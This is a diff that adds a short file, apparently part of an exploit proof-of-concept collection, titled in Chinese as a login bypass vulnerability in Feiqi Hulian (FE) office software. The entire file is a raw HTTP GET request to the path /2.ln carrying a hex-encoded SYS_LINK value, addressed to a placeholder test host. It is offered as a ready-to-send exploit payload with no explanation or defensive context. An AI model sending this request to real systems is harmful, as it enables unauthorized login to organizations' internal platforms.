@@ -1,0 +1,9 @@
+# 飞企互联登录绕过漏洞
+GET /2.ln?SYS_LINK=77507068764957484a5067777862714f457a66574871642f4330574c76717868394a35496d37416c497951724f33446f51486375685a5a2b31684938472b7056 HTTP/1.1
+Host: www.testrule.com:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+
